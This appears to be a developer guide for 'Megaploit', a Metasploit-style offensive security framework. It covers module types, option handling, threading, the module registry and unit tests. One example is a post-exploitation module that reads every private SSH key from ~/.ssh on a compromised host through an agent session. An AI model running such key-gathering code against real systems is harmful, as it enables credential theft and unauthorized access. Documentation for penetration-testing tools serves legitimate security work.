# Module System Developer Guide

## Overview

The Megaploit module system follows Metasploit conventions: each module is a Python file that defines one class (a subclass of `Module`) and a module-level `MODULE` variable pointing to it. The registry auto-discovers all files in `megaploit/modules/`.

---

## Module Types

| Type | Enum | Use case |
|---|---|---|
| `auxiliary` | `ModuleType.AUXILIARY` | Scanners, fuzzers, info gathering |
| `exploit` | `ModuleType.EXPLOIT` | Vulnerability exploitation |
| `post` | `ModuleType.POST` | Post-exploitation (use `AgentModule` — see below) |
| `payload` | `ModuleType.PAYLOAD` | Payload generators |

---

## Directory Convention

```
megaploit/modules/
├── auxiliary/
│   ├── scanner/my_scanner.py   → name = "auxiliary/scanner/my_scanner"
│   └── brute/ssh_brute.py      → name = "auxiliary/brute/ssh_brute"
├── exploits/
│   └── windows/smb/my_exp.py   → name = "exploits/windows/smb/my_exp"
├── post/
│   └── linux/gather_keys.py    → name = "post/linux/gather_keys"
└── payloads/
```

The module's `name` attribute controls where it appears in `show modules`, not the filename.

---

## Minimal Module Template

```python
from megaploit.modules.base import Module, ModuleType, OptionType

class MyScanner(Module):
    name        = "auxiliary/scanner/my_scanner"
    description = "One-line description of what this does"
    module_type = ModuleType.AUXILIARY
    author      = "your-handle"
    references  = ["https://example.com/cve-2025-1234"]
    platform    = ["linux", "windows"]
    arch        = ["x64"]
    rank        = 300

    def _define_options(self) -> None:
        self._opt("RHOSTS",  OptionType.STRING,  required=True,
                  description="Target IP, hostname, or CIDR")
        self._opt("PORT",    OptionType.PORT,    default=80, required=False)
        self._opt("TIMEOUT", OptionType.INTEGER, default=5, required=False)
        self._opt("SSL",     OptionType.BOOLEAN, default=False, required=False)
        self._opt("PROTO",   OptionType.ENUM,    default="http", required=False,
                  choices=["http", "https", "ftp"])

    def check(self, session=None):
        """Optional: verify target is reachable without exploiting."""
        return f"Target {self.get('RHOSTS')} appears reachable"

    def run(self, session=None):
        self.validate()
        self.results.clear()
        rhosts = str(self.get("RHOSTS"))
        self._emit(f"[*] Starting scan of {rhosts}")
        for host in self.expand_cidr(rhosts):
            if self._stopped():
                break
            # ... your logic ...
            self._ok(f"Found: {host}", host=host)
        return self.results

MODULE = MyScanner
```

---

## AgentModule — Session-Bound Post Modules (NEW v3)

`AgentModule` is a `Module` subclass designed for post-exploitation modules that interact with a live agent session. It eliminates boilerplate by providing built-in `_send`, `_upload`, and `_download` helpers.

```python
from megaploit.modules.base import AgentModule, ModuleType, ModuleError

class GatherSSHKeys(AgentModule):
    name        = "post/linux/gather_ssh_keys"
    description = "Collect SSH private keys from ~/.ssh/"
    module_type = ModuleType.POST
    platform    = ["linux"]
    author      = "your-handle"

    def run(self, session=None):
        self.validate()
        sess = session or self.session
        if sess is None:
            raise ModuleError("No session — attach one with: module.session = sess")

        # _send routes through dispatch() automatically
        listing = self._send("shell ls ~/.ssh/", sess)
        for fname in listing.splitlines():
            fname = fname.strip()
            if fname and not fname.endswith(".pub"):
                content = self._send(f"shell cat ~/.ssh/{fname}", sess)
                if content.strip():
                    self._ok(f"key: {fname}", content=content)
        return self.results

MODULE = GatherSSHKeys
```

**Available helpers:**

| Helper | Signature | Description |
|---|---|---|
| `self.session` | attribute | Active session (set by console) |
| `_send(cmd, session=None)` | → str | Dispatch command, return output |
| `_shell(cmd, session=None)` | → str | Alias for `_send` |
| `_upload(local, remote, session=None)` | → str | Push local file to target |
| `_download(remote, local, session=None)` | → str | Pull file from target |

The console sets `module.session = session` before calling `run()`, so the `session` keyword arg is optional — useful for unit-testing without a live session.

---

## Option Types Reference

| Type | Constant | Coercion / Validation |
|---|---|---|
| String | `OptionType.STRING` | Raw string, stripped |
| Integer | `OptionType.INTEGER` | `int(raw)`, ValueError → ModuleError |
| Boolean | `OptionType.BOOLEAN` | `true/yes/1/on` → True; `false/no/0/off` → False |
| Address | `OptionType.ADDRESS` | Accepts hostnames + IPs |
| CIDR | `OptionType.CIDR` | Validated with `ipaddress.ip_network()` |
| Port | `OptionType.PORT` | Integer 1–65535 |
| Enum | `OptionType.ENUM` | Must be in `choices` list |

---

## Output & Results

### `_emit(message)` — Real-time streaming

```python
self._emit("[*] Scanning 10.0.0.0/24")
self._emit("[+] Found open port 80 on 10.0.0.1")
self._emit("[-] 10.0.0.2 timed out")
```

### `_ok(message, **data)` — Success result

```python
self._ok("SSH version grabbed", host="10.0.0.1", banner="SSH-2.0-OpenSSH_8.9")
```

### `_fail(message, **data)` — Failure result

```python
self._fail("Connection refused", host="10.0.0.1", port=22)
```

### Inspecting results after run

```python
for result in module.results:
    print(result.ok, result.message, result.data, result.timestamp)
```

---

## Threading Pattern

All built-in scanner modules use `ThreadPoolExecutor`:

```python
from concurrent.futures import ThreadPoolExecutor, as_completed

def run(self, session=None):
    self.validate()
    self.results.clear()
    hosts = list(self.expand_cidr(str(self.get("RHOSTS"))))

    with ThreadPoolExecutor(max_workers=int(self.get("THREADS"))) as pool:
        futs = {pool.submit(self._check_one, h): h for h in hosts}
        for fut in as_completed(futs):
            if self._stopped():
                pool.shutdown(wait=False, cancel_futures=True)
                break
            # ... process fut.result() ...

    return self.results
```

---

## CIDR Helper

```python
for host in self.expand_cidr("192.168.1.0/24"):
    print(host)   # "192.168.1.1", "192.168.1.2", ...

# Single IP also works:
list(self.expand_cidr("10.0.0.1"))   # ["10.0.0.1"]
```

---

## Rate-Limited Iteration

```python
for host in self._throttled_hosts(hosts, rate_per_sec=50.0):
    self._check_one(host)
```

---

## Module Rank Convention

| Rank | Label | Meaning |
|---|---|---|
| 100 | Low | Often crashes the target |
| 200 | Average | Somewhat reliable |
| 300 | Normal | Usually works |
| 400 | Good | Reliable |
| 500 | Great | Very reliable |
| 600 | Excellent | Extremely reliable |

---

## Running the Registry

```python
from megaploit.modules.registry import module_registry

loaded, errors = module_registry.reload()

entry = module_registry.get("auxiliary/scanner/tcp_port")
module = entry.instantiate()
module.set("RHOSTS", "10.0.0.0/24")
module.run()

results = module_registry.search("smb")

for entry in module_registry.all():
    print(entry.name, entry.module_type.value, entry.rank)
```

---

## Testing Your Module

### Testing a scanner module

```python
# tests/test_my_module.py
from megaploit.modules.auxiliary.my_scanner import MyScanner
from megaploit.modules.base import ModuleError
import pytest

def test_validate_requires_rhosts():
    m = MyScanner()
    with pytest.raises(ModuleError, match="RHOSTS"):
        m.validate()

def test_run_returns_results(monkeypatch):
    m = MyScanner()
    m.set("RHOSTS", "127.0.0.1")
    monkeypatch.setattr(m, "_check_one", lambda h: True)
    results = m.run()
    assert len(results) > 0
```

### Testing an AgentModule

```python
# tests/test_my_post_module.py
from unittest.mock import MagicMock, patch
from megaploit.modules.base import AgentModule, ModuleType
from megaploit.server.commands import CommandResult

class MyPost(AgentModule):
    name = "post/test/my_post"
    def run(self, session=None):
        out = self._send("sysinfo", session)
        self._ok("done", output=out)
        return self.results

def test_post_module_uses_dispatch():
    m = MyPost()
    sess = MagicMock()
    fake = CommandResult(ok=True, output="Linux x86_64")
    with patch("megaploit.server.commands.dispatch", return_value=fake):
        results = m.run(session=sess)
    assert results[0].ok
    assert results[0].data["output"] == "Linux x86_64"
```
